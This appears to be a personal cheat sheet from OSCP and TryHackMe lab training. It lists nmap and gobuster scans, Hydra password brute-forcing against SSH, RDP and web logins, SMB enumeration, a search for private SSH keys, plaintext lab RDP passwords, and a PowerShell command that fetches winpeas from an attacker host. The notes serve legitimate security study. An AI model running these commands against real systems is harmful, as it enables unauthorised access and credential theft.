Nmap scan
nmap -sV -sC -o nmap 10.10.85.80

https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/


nmap vulscan
└─$ └─$ sudo nmap -sV --script vuln 10.10.10.75

gobuster dir -e -u 10.10.10.9 -x php,txt,cgi,css,py,html -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -s "204,301,307,401,403" -k -t 64 --timeout 20s



Gobuster 
gobuster dir -e -u 10.10.243.102 -x php,txt,cgi,css,py,html -w /usr/share/dirb/wordlists/common.txt

gobuster dir -u 10.10.81.56 -w directory-list-2.3-medium.txt

wildcard related error
gobuster dir -e -u http://10.10.20.239/api/site-log.php -x php,txt,cgi,css,py,html -w /usr/share/dirb/wordlists/common.txt -s "204,301,302,307,401,403"


Hydra Brute force
https://redteamtutorials.com/2018/10/25/hydra-brute-force-https/
##SSH
kali@kali:~/oscptraining/tryhackme/brooklyn99$ hydra 10.10.216.12 ssh -l jake -P /usr/share/wordlists/rockyou.txt
##HTTP-POST
hydra -l <username> -P /usr/share/wordlists/<wordlist> <ip> http-post-form
go to inspect element > network > edit and send the post request, copy referer:request body:failed message

hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.246.210 http-post-form "/Account/login.aspx?ReturnURL=%2fadmin%2f:__VIEWSTATE=kcSMO%2FXF1GCTeqt5uRKPoYMbob7ILPmcJ8MRMGNpv2FneCHIfEXPYOSXqtxv7DNoE8I3ocTwXLS9nE%2BFsrLJiHyETHd061sGnCLUvKIZ98Tw51yIvJPBPwCnvZkSPBN1IGUjaSXna2xuK3zLhKzuJMYEMGp%2BJaP2%2FnW3KLtiHdSkJNaf&__EVENTVALIDATION=An1jltDUr%2FrJuqK%2FrWVjD8jVjSf5VMWKvH%2BRo5qQE9Qj4eGYCBTjNSWsFE5%2FEkHkpfIodOJNXbmfoUTYDVGixWMGR8Uh4t4o5X9Rt16ieHoB4SXqj2wNQW3KckOfeclwpBQJbmdFBCPS%2FdzwfeBzvm1jPbMdBiH2IFcI0iE0FX3uIkeq&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed"

WORDPRESS
hydra -l admin -P /home/kali/seclists/Passwords/rockyou.txt 10.10.21.239 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Finternal.thm%2Fblog%2Fwp-admin%2F&testcookie=1:login_error"


LOCAL HOST
hydra -l admin -P /home/kali/seclists/Passwords/rockyou.txt 127.0.0.1 -s 8080 -V -f http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password"


Brute force against a protocol of your choice
hydra -P <wordlist> -v <ip> <protocol>

Attack a Windows Remote Desktop with a password list.
hydra -t 1 -V -f -l <username> -P <wordlist> rdp://<ip>

Number of parallel connections per target  -t 16
hydra -t 16 -l administrator -P /usr/share/wordlists/rockyou.txt -vV 10.10.30.60 ssh




### SMB Enum (port 445, 139)
''' 
        nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.117.251
        smbclient ///10.10.117.251/Users

        smbclient //10.10.223.79/anonymous -u anonymous 

        for no password login 
        smbclient -L \\\\10.10.178.186\\ -N 

        for copying file from local to victim
        put xxx.txt

        for downloading from victim to local
         xxx.txt

'''


### RPC Enum (port 111)
'''
sudo showmount -e 10.10.178 186 
Export list for 10.10.178.186:
/opt/conf *

Now we need to mount /opt/conf in our local directory, and for that we need to create a mount point (directory) with the name mount0.



'''

Our vulnerable machine in this example has a directory called backups containing an SSH key that we can use for authentication. This was found via: find / -name id_rsa 2> /dev/null....Let's break this down:

We're using find to search the volume, by specifying the root (/) to search for files named "id_rsa" which is the name for private SSH keys, and then using 2> /dev/null to only show matches to us.


search the machine for executables with the SUID permission set: find / -perm -u=s -type f 2>/dev/


for remote desktop
xfreerdp /u:littlehelper /p:iLove5now! /v:10.10.247.111

PowerShell Invoke-WebRequest


get winpeas in

powershell Invoke-WebRequest -Uri http://10.8.102.117:80/oscptraining/winpeas.bat -Outfile 'C:\Windows\Temp\winpeas.bat'

     


kali@kali:~/oscptraining$ xfreerdp /u:administrator /p:4q6XvFES7Fdxs /v:10.10.4.115





